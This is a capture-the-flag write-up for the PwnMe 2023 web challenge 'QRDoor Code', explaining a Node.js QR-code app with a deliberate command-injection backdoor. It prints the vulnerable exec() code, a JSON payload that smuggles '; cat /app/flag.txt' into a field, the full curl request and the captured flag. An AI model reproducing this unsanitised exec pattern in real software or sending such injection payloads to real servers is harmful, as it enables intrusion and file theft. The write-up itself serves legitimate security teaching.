---
title: "[Easy][PwnMe 2023][Web] QRDoor Code"
date: "2023-05-07"
categories: [ "CTF", "PwnMe 2023 CTF", "Web" ]
ShowToc: false
draft: false
weight: 2
---

## Introduction

This challenge is a WEB challenge from the PWNME 2023 CTF.

### Background explanation

A company needs a website to generate a QR Code. They asked a freelancer to do this work.

Since the website went live, they have noticed strange behavior on their server.

They need your help to audit their code and help them solve their problem.

### Directive

The flag is located in **/app/flag.txt**.

## Solution

The website's sources are available for download [here](https://github.com/mxcezl/PwnMe-CTF-2023/tree/main/Web/Easy/QRDoor%20Code).

The application is developed in Node.js and runs an Express server.

It allows users to generate a QR Code from a value entered by the user.

![QRDoor Code](/images/pwnme2023/web/qrdoor_exemple.png)

For example, here we generated a QRCode with the value **PWNME2023**.

There is a mention at the top of the page indicating that the maximum size of the input is 150 characters. Beyond that, a random sentence is generated for the QR Code.

The project contains two endpoints that are used:

- **/**: which displays the homepage
- **/generate**: which generates the QR Code

### Code analysis

#### Home page endpoint

```javascript
app.get('/', async (req, res) => {
    res.render('index');
});
```

The homepage is rendered by the EJS template engine.

There is nothing particular to note about this resource.

#### Generation endpoint

```javascript
app.post('/generate', async (req, res) => {
    const { value } = req.body;
    try {
        let newQrCode;
        // If the length is too long, we use a default according to the length
        if (value.length > 150)
            newQrCode = new QRCode(null, value.lenght)
        else {
            newQrCode = new QRCode(String(value))
        }
        
        const code = await newQrCode.getImage()
        res.json({ code, data: newQrCode.value });
    } catch (error) {
        res.status(422).json({ message: "error", reason: 'Unknow error' });
    }
});
```

This function is more interesting to analyze.

We see that the **value** input is retrieved from the request body, and if the length of the value is greater than 150 characters, then the value is not taken into account, only its length.

Finally, the `getImage()` function is called on the `newQrCode` object, and the result is returned to the client.

Let's look at the sources of the `QRCode` class:

```javascript
class QRCode {
    constructor(value, defaultLength){
        this.value = value
        this.defaultLength = defaultLength
    }

    async getImage(){
        if(!this.value){
            // Use 'fortune' to generate a random funny line, based on the input size
            try {
                this.value = await execFortune(this.defaultLength)
            } catch (error) {
                this.value = 'Error while getting a funny line'
            }
        }
        return await qrcode.toDataURL(this.value).catch(err => 'error:(')
    }
}
```

To generate a QRCode, the `getImage()` function first checks that the value is not empty.

If there is a value, then the `execFortune()` function is called with the `defaultLength` value as a parameter.

```javascript
function execFortune(defaultLength) {
    return new Promise((resolve, reject) => {
     exec(`fortune -n ${defaultLength}`, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      }
      resolve(stdout? stdout : stderr);
     });
    });
}
```

Here, we clearly identify a possible command injection by manipulating the size of the value.

One might think it's impossible to exploit given that it's an integer passed as a parameter to execFortune, but let's take a closer look at how the size of the value is checked:

```javascript
if (value.length > 150)
    newQrCode = new QRCode(null, value.lenght)
else {
    newQrCode = new QRCode(String(value))
}
```

We notice a typo in the variable `value.lenght`, which should be `value.length` in the case where the value is greater than 150 characters.

The initial request sent a JSON like this:

```json
{
    "value": "PWNME2023"
}
```

We can modify the request to take advantage of this typo by sending:

```json
{
    "value": {
        "length": 151,
        "lenght": "; cat /app/flag.txt"
    }
}
```

Thus, the control is interpreted:

```javascript
if (151 > 150)
    newQrCode = new QRCode(null, "; cat /app/flag.txt")
else {
    newQrCode = new QRCode(String(value))
}
```

Then in the `getImage()` function:

```javascript
function execFortune("; cat /app/flag.txt") {
    return new Promise((resolve, reject) => {
     exec(`fortune -n ; cat /app/flag.txt`, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      }
      resolve(stdout? stdout : stderr);
     });
    });
}
```

So, with this final request, we can read the flag:

```bash
curl 'http://13.37.17.31:54224/generate' \
  -H 'Content-Type: application/json; charset=UTF-8' \
  --data-raw '{"value":{"length":151,"lenght":"; cat /app/flag.txt"}}'
```

Response:

```json
{
    "code":"data:image/png;base64,...",
    "data":"PWNME{E4Sy_P34sI_B4CkdO0R}"
}
```

Flag: PWNME{E4Sy_P34sI_B4CkdO0R}

## Tips & Tricks

- Be careful with typos in the code.
- Identify functions that can be called with user-manipulated parameters.
- If the data is in JSON format, try modifying the data type (string, int, array, object, etc.).